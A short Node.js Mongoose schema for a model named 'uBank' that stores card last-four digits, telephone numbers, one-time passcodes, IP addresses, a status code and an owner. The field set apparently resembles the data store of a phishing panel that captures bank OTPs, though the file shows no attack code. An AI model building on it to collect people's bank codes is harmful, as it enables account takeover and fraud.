const mongoose = require("mongoose");

const ubankSchema = new mongoose.Schema({
  uniqueid: Number,
  last4: Number,
  telephone: String,
  otp: String,
  status: Number,
  ip: String,
  owner: String,
});

module.exports = mongoose.model("uBank", ubankSchema);
